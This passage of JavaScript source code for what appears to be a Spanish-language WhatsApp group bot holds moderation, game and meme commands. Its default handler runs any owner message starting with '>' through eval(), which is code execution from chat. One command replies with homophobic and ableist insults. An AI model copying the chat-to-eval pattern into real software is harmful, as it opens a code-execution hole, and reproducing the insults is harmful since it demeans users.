					var foda =['el amor inmaduro dice: Te amo porque te necesito','La vida comienza cada cinco minutos','Donde fallan las palabras, la música habla','Un buen viajero no tiene planes','Una vez que aceptamos nuestros límites, los superamos ','Lo que no nos mata nos hace más fuertes','Si caminas solo, irás más rápido Si caminas juntos, llegarás más lejos','Una vida llena de errores no sólo es más honorable, sino que es más sabia que una vida pasada sin hacer nada','Nunca pierdas el sentido del humor y aprende a reírte de tus propios fracasos','La preocupación es como una mecedora, te mantiene ocupado pero no te lleva a ninguna parte','El hombre que ha vivido el más longevo no es el que más años ha cumplido, sino el que más ha experimentado la vida','Si puedes soñarlo, puedes hacerlo','Lo imposible es el fantasma de los tímidos y el refugio de los cobardes','El camino que nos toca recorrer 998 está lleno de sorpresas. Nunca estarás preparado para quienes te toquen, ya sean felices u oscuros, porque eso es parte de ganar experiencia. Y descubrir lo agradables o infelices que son quienes te esperan, es algo que nunca podrás evitar','La felicidad no es algo que postergas para el futuro, es algo que proyectas en el presente','Los amigos deben ser como el dinero, que antes de necesitarlo, sabes su valor','El hombre que más ha vivido no es el que más años ha cumplido, sino el que más ha experimentado la vida','¡No cuentes los días, vívelos! ☀️😎','Todo lo que viene, viene con algún propósito. Como todo lo que sucede, sucede por una razón. 🌸🌀','No me gusta exigir actitud a nadie porque me sobra. 😉','Me gusta mucha gente, pero mi prioridad siempre seré yo mismo. ✨','La gente que critica es la misma que copia. 👀','Aprendí que mi único límite es mi mente. ??','Hacer de mis sueños una meta. 💭']
					var zaltin = foda[Math.floor(Math.random() * foda.length)]
					enviar(` ${zaltin} `)
					break
case 'admins': case 'listadmins': case 'listaadmins':   
if(!isGroup) return enviar(respuesta.grupos)
ytb = `[👑] *Lista de admins del grupo* : \n\n *${groupMetadata.subject}*\n\nTotal : ${groupAdmins.length}\n\n`
no = 0
for (let admon of groupAdmins) {
no += 1
ytb += `[${no.toString()}] @${admon.split('@')[0]}\n`
}
try{
mentions(ytb, groupAdmins, true)
} catch {
enviar('[❌] Error')
}
break
case 'novolink': case 'redefinir': case "nuevolink": case "resetlink":
if(!isGroup) return enviar(respuesta.grupos)
if(!isBotGroupAdmins) return enviar('[❌️] Para que este comando funcione , el bot debe ser admin')
if(!isGroupAdmins) return enviar('[❌️] No eres Administrador')
try {
await sock.groupRevokeInvite(from)
enviar('[✅️] *LINK RESTABLECIDO* ')
} catch(e) {
console.log(e)
enviar(`[❌️] *ERROR* `)
}
break
case 'ruletaban': case "ruletaBan" : case "ruletabam":
if(!isOwner) return enviar("Solo mi creador puede usar este comando")
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
try {
jds = []
const A2 = groupMembers
const B2 = groupMembers
 const C2 = A2[Math.floor(Math.random() * A2.length)]
 setTimeout( () => {
D1 = `[🔫] 𝗘𝗟 𝗝𝗨𝗚𝗔𝗗𝗢𝗥 @${C2.id.split('@')[0]}\n\n[🗡]𝙎𝙀𝙍𝘼 𝙀𝙇𝙄𝙈𝙄𝙉𝘼𝘿𝙊`			
mentions(D1, jds, true)				
}, 1000)
jds.push(C2.id)				  
setTimeout( () => {
if(C2.id == BotNumber) return enviar('El bot no puede ser Eliminado')
jds.push(C2.id)
sock.groupParticipantsUpdate(from, [C2.id], "remove")
}, 2000)
} catch(e) {
console.log(e)
enviar(respuesta.error)
}
break
case 'afk':
if (!q) return enviar('[❌️] No hay texto\nEscriba algun motivo por lo cual no estará conectado')    
if(!isGroup) return enviar(respuesta.grupos)
                let reason = `${q}`
                afk.addAfkUser(sender, Date.now(), reason, _afk)
                enviar(`@${sender.split('@')[0]} Actualmente con AFK\nRazón : ${reason}`)
                break
case 'promote':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
var number = text.split`@`[1]
var usehr = number + '@s.whatsapp.net'
sock.sendMessage(from,{ text :  `*[❗️] Fuiste elejido como nuevo administrador : ${usehr} *\n🍒 𝙰𝙲𝙲𝙸𝙾𝙽 𝚁𝙴𝙰𝙻𝙸𝚉𝙰𝙳𝙰 𝙿𝙾𝚁: @${sender.split('@')[0]}` , mentions: [usehr, sender]})
try{
sock.groupParticipantsUpdate(from, [usehr], 'promote')
} catch {
enviar("error")
}
break
case 'demote':
if(!isGroup) return enviar(respuesta.grupos)
        if (!isGroupAdmins) return enviar(respuesta.admin)
        if (!isBotGroupAdmins) return enviar(respuesta.botadmin)
var number = text.split`@`[1]
var usehr = number + '@s.whatsapp.net'
sock.sendMessage(from,{ text :  `*[❗️] Se te quito la administración : ${usehr} *\n🍒 𝙰𝙲𝙲𝙸𝙾𝙽 𝚁𝙴𝙰𝙻𝙸𝚉𝙰𝙳𝙰 𝙿𝙾𝚁: @${sender.split('@')[0]}` , mentions: [usehr, sender]})
try{
sock.groupParticipantsUpdate(from, [usehr], 'demote')
} catch {
enviar("error")
}
break
case 'curso': case 'cursos':
enviar(cursodd)
break
case 'serbot': case 'subbot':
loku = ["*[🤮] Cierrra la boca, retrasado de mrd*","[🤮] *La gente estupida como tú, solo usa esa porquería*","[🤮] *Gay detectado*"]
luk = loku[Math.floor(Math.random()*loku.length)]
enviar(luk)
break
case 'sopadeletras':
cambioLetra = sopaDir
let tagUser = userSP + '@s.whatsapp.net'
if (sender.split("@")[0] === userSP) {
if (intentos === 0) {
intentos = 3  
generarSopaDeLetras()
resetUserSP(sopaDir)
async function resetUserSP(sopaDir) {
if (intentos === 0) {
await enviar(from,{ text: `*@${sender.split("@")[0]} Mi king Se te acabarón los intentos!!* 😧\n\n*LA PALABRA _"${sopaPalabra}"_ SE ENCONTRABA EN LA DIRECCIÓN _${sopaDir}_ DE LA FILA _${fila}_ Y COLUMNA _${columna}_*`,mentions: [sender] },{ quoted : info})
fila = null, columna = null, sopaNube = null, sopaPalabra = null, sopaDir = null, userSP = null, cambioLetra = null
intentos = 0
}
}}else {
if (`${fila}${columna}` == text) {
await enviar(`*🎊 HAS GANADO*`)
fila = null, columna = null, sopaNube = null, sopaPalabra = null, sopaDir = null, userSP = null, cambioLetra = null
intentos = 0
}else{
if (intentos === 1) {
await enviar(`🫡 *AGOTASTE LOS INTENTOS!! LA PALABRA _"${sopaPalabra}"_ SE ENCONTRABA EN LA DIRECCIÓN _${cambioLetra}_ DE LA FILA _${fila}_ Y COLUMNA _${columna}_*`)
fila = null, columna = null, sopaNube = null, sopaPalabra = null, sopaDir = null, userSP = null, cambioLetra = null
intentos = 0
} else {
intentos -= 1
await enviar(`😮‍💨 *INCORRECTO. TE QUEDAN _${intentos}_ INTENTOS!!*`)
}}
}
} else {
enviar(`Lo siento pero Él Juego se encuentra ocupado con otro jugador : ${userSP}`)
}
break
case 'gay': case 'gey':
if(!q) return enviar("Remarque a una persona Porfavor")
var porcent1 = ["50%","60%","70%","80%","90%","100%","45%","55%","35%","25%","15%","05%","65%","75%","85%","95%"]
var porcent = porcent1[Math.floor(Math.random()*porcent1.length)]
let who = mentioned = info.message.extendedTextMessage.contextInfo.mentionedJid[0] ? info.message.extendedTextMessage.contextInfo.mentionedJid[0] : info.message.extendedTextMessage.contextInfo.participantr
try{
ppusetr = await sock.profilePictureUrl(who, 'image')
} catch {
ppusetr = `https://i.postimg.cc/rwG0nYXK/Mini-julscito.jpg`
}
var guk = await getBuffer(`https://rest-api.akuari.my.id/canvas/gay?link=${encodeURIComponent(ppusetr)}&nama=${encodeURIComponent(who)}&persen=${encodeURIComponent(porcent)}`)
sock.sendMessage(from,{ image : guk, caption : `*🏳️‍🌈 𝙂𝘼𝙔 𝙂𝘼𝙔!! 🏳️‍🌈*`},{ quoted : info})
try{
enviarmusica(kbro,nombreBott,`Dios te bendiga ${pushname}`,ppusetr)
} catch {
console.log("Error al enviar la musica")
}
break

case 'smeme': 
  if(!isQuotedImage) return enviar('[❗️] *Remarque una imagen Porfavor*')
  enviar("[⏳️] Creando Meme en sticker..")
  try{
   var atas = q.split('|')[0] ? q.split('|')[0] : 'juls'
   var bawah = q.split('|')[1] ? q.split('|')[1] : 'domina'
  var encmediass = isQuotedImage ? info.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage: info.message.imageMessage
var raneee = ('./tmp/Db_Juls.'+ await getExtension(encmediass.mimetype))
var imgbuffee = await getFileBuffer(encmediass, 'image')
fs.writeFileSync(raneee, imgbuffee)
var mediass = raneee
var rannn = getRandom('.'+mediass.split('.')[1])
var uploadd44 = await TelegraPh(mediass)
  var too = await getBuffer(`https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${uploadd44}`) 
    await enviarfiguimg(from, too, info, {
 packname: `${pushname}`, author: `${author}`
})
  } catch {
  enviar(respuesta.error)
  }
break
// JUEGO AKINATOR
case 'resetaki':
try {
if(babiee && babiee.player != sender && !isGroupAdmins && !isOwner) return enviar('[❌️] 𝐍𝐎 𝐓𝐄 𝐌𝐄𝐓𝐀𝐒 𝐃𝐎𝐍𝐃𝐄 𝐍𝐎 𝐓𝐄 𝐋𝐋𝐀𝐌𝐀𝐍, 𝐓𝐔 𝐍𝐎 𝐄𝐒𝐓𝐀𝐒 𝐉𝐔𝐆𝐀𝐍𝐃𝐎 𝐂𝐓𝐌𝐑𝐄')
babiee = undefined
fs.writeFileSync('./archivos/juegos/akinator.json', JSON.stringify(akinator))
enviar(`[🔮] 𝙴𝙻 𝙹𝚄𝙴𝙶𝙾 𝚂𝙴 𝙴𝚂𝚃𝙰 𝚁𝙴𝙸𝙽𝙸𝙲𝙸𝙰𝙽𝙳𝙾, 𝙳𝙴𝚂𝙴𝙰 𝙹𝚄𝙶𝙰𝚁 𝙾𝚃𝚁𝙰 𝙿𝙰𝚁𝚃𝙸𝙳𝙰?.\n\n𝙳𝙸𝙶𝙸𝚃𝙴 𝙰𝙺𝙸𝙽𝙰𝚃𝙾𝚁 , 𝙾 𝙽𝙾 𝙰𝙺𝙸𝙽𝙰𝚃𝙾𝚁
`)
} catch {
enviar("𝙽𝙾 𝙷𝙰𝚈 𝙽𝙸𝙽𝙶𝚄𝙽𝙰 𝚂𝙴𝚂𝙸𝙾𝙽 𝙰𝙲𝚃𝙸𝚅𝙰 , 𝙿𝙾𝚁 𝙴𝙻𝙻𝙾 𝙽𝙾 𝙻𝙾 𝙿𝚄𝙴𝙳𝙾 𝚁𝙴𝙸𝙽𝙸𝙲𝙸𝙰𝚁")
}
break
case 'aki':
if(babiee && babiee.player != sender) return enviar('❌️ 𝐍𝐎 𝐓𝐄 𝐌𝐄𝐓𝐀𝐒 𝐃𝐎𝐍𝐃𝐄 𝐍𝐎 𝐓𝐄 𝐋𝐋𝐀𝐌𝐀𝐍, 𝐓𝐔 𝐍𝐎 𝐄𝐒𝐓𝐀𝐒 𝐉𝐔𝐆𝐀𝐍𝐃𝐎 𝐂𝐓𝐌𝐑𝐄')
if(args.length < 1) return 
await babiee.game.step(args[0])
if(babiee.game.progress > 85) {
    await babiee.game.win()
    teks = `[🔮]𝐏𝐎𝐑 𝐒𝐈 𝐀𝐂𝐀𝐒𝐎 𝐒𝐔 𝐏𝐄𝐑𝐒𝐎𝐍𝐀𝐉𝐄 𝐄𝐒 : ${babiee.game.answers[0].name}?\n\n[🎁]𝐃𝐈𝐆𝐈𝐓𝐄 𝐏𝐄𝐑𝐒𝐎𝐍𝐀𝐉𝐄 𝐒𝐈 , 𝐎 𝐏𝐄𝐑𝐒𝐎𝐍𝐀𝐉𝐄 𝐍𝐎`
sock.sendMessage(from,{ image : {url: babiee.game.answers[0].absolute_picture_path} , caption : teks}, { quoted : info})      
} else {
if(q =="si") {
sock.sendMessage(from,{ image : { url : `https://i.postimg.cc/rpgXw93R/images-2.jpg` }, caption : `🅿🅸🆂🆃🅰 :${babiee.game.question}\n\n[🍿] ℙ𝔸ℝ𝔸 ℝ𝔼𝕊ℙ𝕆ℕ𝔻𝔼ℝ 𝔻𝕀𝔾𝕀𝕋𝔼 : αкι ѕι , αкι ησ, αкι тαℓνєz , αкι ηυη¢α , αкι ησѕє`}, { quoted : info})
} else if(q == "no") {
sock.sendMessage(from,{ image : { url : `https://i.postimg.cc/rpgXw93R/images-2.jpg` }, caption : `🅿🅸🆂🆃🅰 :${babiee.game.question}\n\n[🍿] ℙ𝔸ℝ𝔸 ℝ𝔼𝕊ℙ𝕆ℕ𝔻𝔼ℝ 𝔻𝕀𝔾𝕀𝕋𝔼 : αкι ѕι , αкι ησ, αкι тαℓνєz , αкι ηυη¢α , αкι ησѕє`}, { quoted : info})
} else if(q == "talvez") {
sock.sendMessage(from,{ image : { url : `https://i.postimg.cc/rpgXw93R/images-2.jpg` }, caption : `🅿🅸🆂🆃🅰 :${babiee.game.question}\n\n[🍿] ℙ𝔸ℝ𝔸 ℝ𝔼𝕊ℙ𝕆ℕ𝔻𝔼ℝ 𝔻𝕀𝔾𝕀𝕋𝔼 : αкι ѕι , αкι ησ, αкι тαℓνєz , αкι ηυη¢α , αкι ησѕє`}, { quoted : info})
} else if(q == "nunca") {
sock.sendMessage(from,{ image : { url : `https://i.postimg.cc/rpgXw93R/images-2.jpg` }, caption : `🅿🅸🆂🆃🅰 :${babiee.game.question}\n\n[🍿] ℙ𝔸ℝ𝔸 ℝ𝔼𝕊ℙ𝕆ℕ𝔻𝔼ℝ 𝔻𝕀𝔾𝕀𝕋𝔼 : αкι ѕι , αкι ησ, αкι тαℓνєz , αкι ηυη¢α , αкι ησѕє`}, { quoted : info})
} else if(q == "nose") {
sock.sendMessage(from,{ image : { url : `https://i.postimg.cc/rpgXw93R/images-2.jpg` }, caption : `🅿🅸🆂🆃🅰 :${babiee.game.question}\n\n[🍿] ℙ𝔸ℝ𝔸 ℝ𝔼𝕊ℙ𝕆ℕ𝔻𝔼ℝ 𝔻𝕀𝔾𝕀𝕋𝔼 : αкι ѕι , αкι ησ, αкι тαℓνєz , αкι ηυη¢α , αкι ησѕє`}, { quoted : info})
} else {
sock.sendMessage(from,{ image : { url : `https://i.postimg.cc/rpgXw93R/images-2.jpg` }, caption : `[🍿] ℙ𝔸ℝ𝔸 ℝ𝔼𝕊ℙ𝕆ℕ𝔻𝔼ℝ 𝔻𝕀𝔾𝕀𝕋𝔼 : αкι ѕι , αкι ησ, αкι тαℓνєz , αкι ηυη¢α , αкι ησѕє`}, { quoted : info})
}
}
break

case "akinator" : 
babiee = {
    id: from,
    player: sender,
    game: new Aki({region: 'es'})
}
fs.writeFileSync('./archivos/juegos/akinator.json', JSON.stringify(akinator))
akinator.push(babiee)
await babiee.game.start()
sock.sendMessage(from,{ image : { url : `https://i.postimg.cc/rpgXw93R/images-2.jpg` }, caption : `[🔮] 𝐇𝐎𝐋𝐀 𝐒𝐎𝐘 𝐀𝐊𝐈𝐍𝐀𝐓𝐎𝐑\n\nɪɴᴛᴇɴᴛᴀʀÉ ᴀᴅɪᴠɪɴᴀʀ ᴛᴜ ᴘᴇʀꜱᴏɴᴀᴊᴇ , ᴘᴀʀᴀ ᴇʟʟᴏ ᴛᴇ ʟᴀɴᴢᴀʀÉ ᴀʟɢᴜɴᴀꜱ ᴘʀᴇɢᴜɴᴛᴀꜱ .ᴛʀᴀᴛᴀ ᴅᴇ ʀᴇꜱᴘᴏɴᴅᴇʀʟᴀꜱ ᴘᴏʀꜰᴀᴠᴏʀ , ᴄᴀꜱᴏ ᴄᴏɴᴛʀᴀʀɪᴏ ᴅɪɢɪᴛᴀ : ɴᴏᴀᴋɪɴᴀᴛᴏʀ.\n\n🅿🅸🆂🆃🅰 :${babiee.game.question}\n\n[🍿] ℙ𝔸ℝ𝔸 ℝ𝔼𝕊ℙ𝕆ℕ𝔻𝔼ℝ 𝔻𝕀𝔾𝕀𝕋𝔼 : αкι ѕι , αкι ησ, αкι тαℓνєz , αкι ηυη¢α , αкι ησѕє`}, { quoted : info})
break
case 'linkbot': case 'botlink':
enviar(`[🍿] *Descarga el bot aquí* : \n\nhttps://www.mediafire.com/file/9vxj3vdq23avb4v/mini-bot2%2528canal%2529.zip/file`)
break
case 'instalarbot': case 'tutobot':
enviar('[🍿] *Mira el tutorial de instalación* : \n\nhttps://youtu.be/oKcZ1DznwZo?si=c0H9bw-1A9iJYQ9W')
break

// COMANDOS SIN PREFIJO
default:
if ((budy.includes(".com")) || (budy.includes("wa.me"))  || (budy.includes(".gt"))|| (budy.includes("http://")) || (budy.includes(".cc")) ||(budy.includes("https://")) ||(budy.includes(".li")) ){
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return 
var Kick = `${sender.split("@")[0]}@s.whatsapp.net`
await sock.groupParticipantsUpdate(from, [Kick], 'remove')
}
                if (budy.startsWith('>')) {
                if(!isOwner) return enviar("[❗] *Solo mi creador Puede usar este comando*")
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await enviar(evaled)
                    } catch (err) {
                        m = String(err)
                        await enviar(m)
                    }
                }
if(isBotGroupAdmins && isAnticatalogo && type === 'productMessage') {
if(isGroupAdmins) return 
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
sock.groupParticipantsUpdate(from, [sender], 'remove')
}

if(isBotGroupAdmins && Antiloc && type === 'locationMessage') {
if(isGroupAdmins) return 
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
sock.groupParticipantsUpdate(from, [sender], 'remove')
}




if (body.length >= limitefl) { 
if(!isAntiFlood) return
if(isAntiFlood && isGroupAdmins && isBotGroupAdmins) {
if(isBot) return 
} else {
if(isOwner) return
if(isGroupAdmins) return
var Kic = `${sender.split("@")[0]}@s.whatsapp.net`  
sock.groupParticipantsUpdate(from, [sender], 'remove')

}
}
if(isAntiSticker && isBotGroupAdmins && type == 'stickerMessage') {
if (info.key.fromMe) return
if(isGroupAdmins) return 
sock.groupParticipantsUpdate(from, [sender], 'remove')
}
//
if (kuismath.hasOwnProperty(sender.split('@')[0])) {
            kuis = true
            jawaban = kuismath[sender.split('@')[0]]

            if (budy.toLowerCase() == jawaban) {
                await enviar(`[ ✅️] *Muy Bien Respuesta Correcta*`)
                delete kuismath[sender.split('@')[0]]
            } else enviar('*[❗️] Respuesta Incorrecta!*')
        }
if(isAntiImg && isBotGroupAdmins && type == 'imageMessage') {
if (info.key.fromMe) return
if(isGroupAdmins) return 
sock.groupParticipantsUpdate(from, [sender], 'remove')
}        
if(isAntiVid && isBotGroupAdmins && type == 'videoMessage') {
if(isGroupAdmins) return 
sock.groupParticipantsUpdate(from, [sender], 'remove')
}        

if(isBotGroupAdmins && isAntiCtt && type === 'contactMessage') {
if(isGroupAdmins) return 
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
sock.groupParticipantsUpdate(from, [sender], 'remove')
}

if(isBotGroupAdmins && isAntiCtt && type === 'contactsArrayMessage') {
if(isGroupAdmins) return 
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
sock.groupParticipantsUpdate(from, [sender], 'remove')
}
if(isAntiAudio && isBotGroupAdmins && type == 'audioMessage') {
if(isGroupAdmins) 
sock.groupParticipantsUpdate(from, [sender], 'remove')
}
if(isAntiNotas && body.toString().match(/(💳|💎|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi) && isBotGroupAdmins) {
if(type == 'stickerMessage') return
let verificar = body.toString().match(/(💳|💎|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi)
if (verificar && body.length < 100) return  
await sock.sendMessage(from, {text: '*Mensaje Prohibido... será eliminado en .. 3... 2...1...*'}, {quoted: info})
setTimeout(async function () {
sock.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}        
if(isAutoReact && isGroup && isCmd) {
if(!isAutoReact) return 
emojis = ["😀", "😃", "😁", "😆", "😂", "??", "😭", "😉", "😘", "😗", "🥰", "😍", "🤩", "🥳", "🙃", "🙂", "🥲", "😋", "😛", "😜", "😝", "😜", "😇", "😊", "☺️", "😏", "😌", "😔", "😑", "😐", "😶", "🤔", "🤫", "🤭", "🥱", "🤗", "🤨", "🧐", "😒", "🙄", "😤", "😠", "🤬", "🥺", "😥", "😟", "☹️", "😦", "😧", "😰", "😨", "😕", "😯", "😲", "😳", "🤯", "😬", "😓", "😓", "😞", "😖", "🥴", "😎", "🤓", "😎", "🥵", "🥶", "🌞", "🤢", "🤮", "🤥", "🤡", "😈", "🥵", "👽", "😷", `⛔️`, "👺", "👹", "💨", "😸", "😹", "❤️", "🫀", "👁️", "☠️", "💀", "👀", "😻", "💋", "🫂", "👄", "👅", "💅", "🙏", "🤳", "✍️", "🙅", "🌀", "☃️", "🔥", "⚡", "🌈", "💧", "🙈", "🍑", "🍒", "🍓", "🍌", "🌶️", "🍆", "🍴", "🍷", "🍴", "🍽️", "🛢️", "🚨", "🎤", "🎭", "📽️", "🎰", "☎️", "📞", "👑", "📉", "💍", "💉", "🗑️", "🗡️", "⚔️", "🚬", "💣", "⁉️", "✅", "👁️‍🗨️", "♥️", "🧡", "💛", "💚", "💙", "💜", "🤎", "🖤", "🤍", "🇧🇷", "🏳️‍🌈", "🇲🇽", "🇪🇸", "🇲🇿", "🇦🇴", "🇺🇲","🤔","🤫","😏","🍆","👺","🙊"]
reassao = emojis[Math.floor(Math.random() * emojis.length)]
sendMsg = await sock.sendMessage(from, {react: {text: reassao, key: info.key}})
}

if(isAutoReact && isGroup && !isCmd) {
if(!isAutoReact) return 
emojis = ["😀", "😃", "😁", "😆", "😂", "🤣", "😭", "😉", "😘", "😗", "🥰", "😍", "🤩", "🥳", "🙃", "🙂", "🥲", "😋", "😛", "😜", "😝", "😜", "😇", "😊", "☺️", "😏", "😌", "😔", "😑", "😐", "😶", "🤔", "🤫", "🤭", "🥱", "🤗", "🤨", "🧐", "😒", "🙄", "😤", "😠", "🤬", "🥺", "😥", "😟", "☹️", "😦", "😧", "😰", "😨", "😕", "😯", "😲", "😳", "🤯", "😬", "😓", "😓", "😞", "😖", "🥴", "😎", "🤓", "😎", "🥵", "🥶", "🌞", "🤢", "🤮", "🤥", "🤡", "😈", "🥵", "👽", "💰", `⛔️`, "👺", "👹", "💨", "??", "😹", "❤️", "🫀", "👁️", "☠️", "💀", "👀", "😻", "💋", "🫂", "👄", "👅", "💅", "🙏", "🤳", "✍️", "🙅", "🌀", "☃️", "🔥", "⚡", "??", "💧", "🙈", "🍑", "🍒", "🍓", "🍌", "🌶️", "🍆", "🍴", "🍷", "🍴", "🍽️", "🛢️", "🚨", "🎤", "🎭", "📽️", "🎰", "☎️", "📞", "👑", "📉", "💍", "💉", "🗑️", "🗡️", "⚔️", "🚬", "💣", "⁉️", "✅", "👁️‍🗨️", "♥️", "🧡", "💛", "💚", "💙", "💜", "🤎", "🖤", "🤍", "🇧🇷", "🏳️‍🌈", "🇲🇽", "🇪🇸", "🇲🇿", "🇦🇴", "🇺🇲","🤔","🤫","😏","🍆","👺","🙊"]
reassao = emojis[Math.floor(Math.random() * emojis.length)]
sendMsg = await sock.sendMessage(from, {react: {text: reassao, key: info.key}})
} 

if (isCmd && comando) {
          sock.sendMessage(from, {text : `[⏳️] ʟᴏ ꜱɪᴇɴᴛᴏ ᴍᴜᴄʜᴏ Qᴜᴇʀɪᴅᴏ ᴜꜱᴜᴀʀɪᴏ, ᴇꜱᴛᴇ ᴄᴏᴍᴀɴᴅᴏ ɴᴏ ᴇxɪꜱᴛᴇ ᴇɴ ᴍɪ ᴅᴀᴛᴀʙᴀꜱᴇ , ᴘᴇʀᴏ ᴇꜱᴛᴀʀᴇᴍᴏꜱ ᴛʀᴀʙᴀᴊᴀɴᴅᴏ ᴘᴀʀᴀ ɪᴍᴘʟᴇᴍᴇɴᴛᴀʀ ᴍÁꜱ .
ꜱɪ ᴛɪᴇɴᴇꜱ ᴀʟɢᴜɴᴀ ꜱᴜɢᴇʀɪᴀɴᴄɪᴀ ᴇꜱᴄʀɪʙᴇ : ꜱᴜɢᴇʀɪʀ + ᴛᴜ ɪᴅᴇᴀ . ʟᴀ ᴇᴠᴀʟᴜᴀʀᴇᴍᴏꜱ , ꜱɪ ɴᴏꜱ ɢᴜꜱᴛᴀ ʟᴏ ᴘᴏɴᴅʀᴇᴍᴏꜱ ᴇɴ ʟᴀ ᴘʀᴏxɪᴍᴀ ᴠᴇʀꜱɪÓɴ, ꜱɪ ʜᴀʏ ᴀʟɢᴜɴ ᴇʀʀᴏʀ ᴏ ʙᴜɢ ᴅᴇ ᴄᴏᴍᴀɴᴅᴏ , ɪɴꜰᴏʀᴍᴀɴᴏꜱ ᴄᴏɴ ᴇʟ ᴄᴏᴍᴀɴᴅᴏ : ʀᴇᴘᴏʀᴛ + ᴛᴜ ᴘʀᴏʙʟᴇᴍᴀ .
ɢʀᴀᴄɪᴀꜱ !`},{ quoted : info})
        }

       
//
} 
 
  } catch (err) {
  console.log(util.format(err))
let e = String(err)
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
if (e.includes("Socket connection timeout")) return


 }        
    })    
}
// run in main file
connectToWhatsApp()

//Reiniciar index
fs.watchFile('./index.js', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log(color('La index fue modificada',"yellow"));
process.exit()
}
})
// Reiniciar menu
fs.watchFile('./archivos/fotos/menu.json', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log(color('la index del menu fue modificada',"yellow"));
process.exit()
}
})
// Reiniciar bienvenida
fs.watchFile('./archivos/fotos/welcome.json', (curr, prev) => {
if (curr.mtime.getTime() !== prev.mtime.getTime()) {
console.log(color('la index de la bienvenida fue modificada',"yellow"));
process.exit()
}
})




